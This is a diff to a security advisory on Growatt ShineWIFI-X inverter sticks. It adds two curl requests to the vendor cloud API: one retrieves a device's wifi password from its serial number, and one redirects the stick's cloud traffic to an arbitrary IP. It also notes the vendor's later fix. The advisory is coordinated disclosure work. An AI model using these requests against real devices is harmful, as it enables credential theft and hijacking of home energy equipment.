@@ -31,8 +31,14 @@ With a valid session from any account, the registers / parameters of connected S
 
 Finding valid serial numbers can be done by analyzing the distribution of the alphanumerical characters and brute forcing. The ShineWIFI-X uses a 10 characters SN with alphanumerical characters (upper case). After a static prefix, the rest of the characters seem to have different distributions (e.g. the 7th characters is only numerical).
 
+Here is the API used to retrieve a wifi password of an inverter, knowing only its serial number:
+
+```
+curl 'https://server.growatt.com/ftp.do' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'cookie: JSESSIONID=X; SERVERID=X' -H 'user-agent: okhttp' --data-raw 'action=readDatalogParam&dataLogSn=XGDXXXXXXX&&paramType=set_any_reg&addr=57' 
+```
+
 > [!NOTE]
-> Details will be provided as soon as the API problem is fixed.
+> Missing API authorization has been fixed.
 
 ## Installing a manipulated firmware remotely
 
@@ -85,10 +91,13 @@ Knowing that, a packet can be craftet, commanding the device to download and ins
 
 ### Redirect the traffic to an attacker-controlled machine
 
-A cloud API can be used to redirect the *device <> cloud* traffic from the ShineWIFI-X stick to *any* IP v4 address. Valid session cookies and the serial number of the targeted ShineWIFI-X stick are needed. 
+A cloud API can be used to redirect the *device <> cloud* traffic from the ShineWIFI-X stick to *any* IP v4 address. Valid session cookies and the serial number of the targeted ShineWIFI-X stick are needed:
 
+```
+curl 'https://server.growatt.com/ftp.do' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'cookie: JSESSIONID=X; SERVERID=X' -H 'user-agent: okhttp' --data-raw 'action=setDatalogParam&dataLogSn=XGDXXXXXXX&paramType=1&param_1=x.x.x.x&param_2=' 
+```
 > [!NOTE]
-> Details will be provided as soon as the API problem is fixed.
+> Missing API authorization has been fixed.
 
 After this command, the targeted ShineWIFI-X stick tries to connect to the given IP.
 
@@ -280,4 +289,5 @@ A manipulated CPU firmware could be used to misuse the internet connection for c
 * 2023-10-16: Report sent to the german BSI and forwarded to the manufacturer
 * 2023-11-29: Answer from the vendor
 * 2024-07-27: Publication
+* 2024-10-31: Fix by vendor
 
